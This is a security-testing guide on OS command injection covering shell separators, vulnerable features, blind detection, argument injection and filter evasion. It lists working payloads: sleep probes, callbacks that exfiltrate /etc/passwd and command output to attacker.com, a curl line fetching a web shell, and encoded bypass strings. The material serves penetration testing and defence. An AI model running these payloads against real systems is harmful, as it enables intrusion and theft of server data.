# Command Injection

> tags: web, injection, intermediate, advanced

> related: Attack-Surface/Web/SSRF/, Attack-Surface/Web/File-Operations/Path-Traversal, Attack-Surface/Web/Injection/SSTI, Attack-Surface/Web/Injection/Deserialization

Command Injection
Command injection happens when user input gets concatenated into an OS command that the server executes. It's conceptually simple  -  you're escaping the intended command context and appending your own  -  but it shows up in surprising places. Any feature that interacts with the OS (file operations, PDF generation, image processing, network diagnostics, git operations) is a candidate. The payoff is direct RCE.
How Command Injection Works
flowchart TD
    A["User input: filename.pdf"] --> B["Server builds command: convert filename.pdf output.png"]
    B --> C["Normal execution"]
    A2["User input: file.pdf; id"] --> B2["Server builds command: convert file.pdf; id output.png"]
    B2 --> D["Shell interprets ; as command separator"]
    D --> E["convert file.pdf runs"]
    D --> F["id runs  -  attacker's command"]

Injection Operators
Different shells support different command separators. Test all of them  -  the backend might be Linux, Windows, or either:
Linux/Unix
;         Command separator  -  runs both commands sequentially
|         Pipe  -  feeds output of first into second (second always runs)
||        OR  -  runs second only if first fails
&         Background  -  runs first in background, second immediately
&&        AND  -  runs second only if first succeeds
$(cmd)    Command substitution  -  executes cmd, inserts output
`cmd`     Backtick substitution  -  same as $()
\n        Newline  -  sometimes works as separator (%0a URL-encoded)
Windows
&         Runs both commands
&&        Runs second if first succeeds
|         Pipe
||        Runs second if first fails
Common Vulnerable Sinks
These application features frequently shell out to OS commands:























































FeatureTypical CommandInjection PointImage processingconvert, ffmpeg, exiftoolFilename, parametersPDF generationwkhtmltopdf, phantomjsURL, HTML contentFile operationstar, zip, unzip, mv, cpFilename, pathNetwork toolsping, traceroute, nslookup, digHostname, IPGit operationsgit clone, git logRepo URL, branch namePackage managersnpm install, pip installPackage nameCI/CD pipelinesdocker build, kubectlBuild args, image namesEmailsendmail, mailRecipient, subjectDNS lookupshost, nslookupDomain name
Practical Testing Flow
Step 1: Identify Potential Injection Points
Any parameter that looks like it could be used in a system command  -  filenames, hostnames, IP addresses, URLs, usernames passed to system utilities.
POST /api/network/ping HTTP/1.1
Host: target.com
Content-Type: application/json
 
{"host": "8.8.8.8"}
Step 2: Test with Time-Based Detection
Sleep-based payloads confirm injection without needing to see output:
POST /api/network/ping HTTP/1.1
Host: target.com
Content-Type: application/json
 
{"host": "8.8.8.8; sleep 10"}
If the response takes ~10 seconds longer than normal, injection is confirmed. Test variants:
8.8.8.8; sleep 10
8.8.8.8 | sleep 10
8.8.8.8 & sleep 10
8.8.8.8 && sleep 10
8.8.8.8 || sleep 10
$(sleep 10)
`sleep 10`
8.8.8.8%0asleep 10
Step 3: Out-of-Band Detection
When you can't observe timing differences (async processing, queued jobs):
; nslookup cmdi-test.burpcollaborator.net
| curl cmdi-test.burpcollaborator.net
$(wget cmdi-test.burpcollaborator.net)
`dig cmdi-test.burpcollaborator.net`
Step 4: Data Exfiltration
Once confirmed, extract output:
# DNS exfil  -  works when HTTP is blocked
; x=$(whoami); nslookup $x.attacker.com
; nslookup $(cat /etc/hostname).attacker.com
 
# HTTP exfil
; curl attacker.com/collect$(id|base64)
; wget attacker.com/collect --post-data="$(cat /etc/passwd)"
Argument Injection
Even when the application doesn't concatenate input into a shell command string (so ; and | don't work), you may be able to inject additional arguments if user input is passed as a command argument:
# Application runs: tar -cf backup.tar <user_input>
# Inject: --checkpoint=1 --checkpoint-action=exec=id
# Result: tar -cf backup.tar --checkpoint=1 --checkpoint-action=exec=id
 
# Application runs: git log <user_input>
# Inject: --output=/tmp/pwned -p
# Result: git log --output=/tmp/pwned -p
 
# Application runs: curl <user_input>
# Inject: -o /tmp/shell.php attacker.com/shell.php
# Result: curl -o /tmp/shell.php attacker.com/shell.php
Key argument injection targets: tar, git, curl, wget, find, rsync, zip, ssh.
Filter Bypass Techniques
When basic operators are filtered:
# Space filtering  -  use alternatives
cat</etc/passwd
{cat,/etc/passwd}
cat${IFS}/etc/passwd
X=$'\x20';cat${X}/etc/passwd
 
# Keyword filtering (e.g., "cat" is blocked)
c'a't /etc/passwd
c""at /etc/passwd
c\at /etc/passwd
/bin/ca? /etc/passwd
$(printf '\x63\x61\x74') /etc/passwd
 
# Slash filtering
$(tr '!' '/' <<< '!etc!passwd')
 
# Using environment variables
${PATH:0:1}  # gives /
${HOME:0:1}  # gives /
 
# Base64 bypass
echo YWlk | base64 -d | sh    # executes 'id' (base64 of 'aid' is wrong  -  use 'aWQ=')
echo aWQ= | base64 -d | sh    # executes 'id'
Distinction from Related Vulnerabilities






























VulnerabilityYou're injecting into...ExampleCommand InjectionOS shell commandping 8.8.8.8; idCode InjectionLanguage interpreter (eval)1+1; system('id')SSTITemplate engine{{7*7}} / ${7*7}SQLiSQL query' OR 1=1--
If the backend uses eval(), exec() (Python), or similar  -  that's code injection, not command injection. The testing approach differs.
Checklist

 Map all parameters that could be passed to system commands (filenames, hostnames, IPs, URLs)
 Test each injection operator: ;, |, ||, &, &&, $(), backticks, %0a
 Use sleep-based payloads for blind detection
 Use DNS/HTTP out-of-band callbacks for async endpoints
 Test argument injection on parameters used as command arguments
 Test filter bypass: space alternatives, string concatenation, encoding
 Check both Linux and Windows payloads  -  you may not know the backend OS
 For image/PDF/file features: test filename injection and metadata injection
 Verify by exfiltrating command output via DNS or HTTP

Public Reports

OS command injection in image processing on Shopify - HackerOne #1019019
Command injection via filename in file upload on GitLab - HackerOne #1154542
Argument injection in git operations on GitHub Enterprise - HackerOne #1125425
Blind command injection in PDF generator - HackerOne #1415253
Command injection via EXIF data in image processing pipeline - HackerOne #1154892

See Also

SSRF
Path Traversal
Server-Side Template Injection
Deserialization
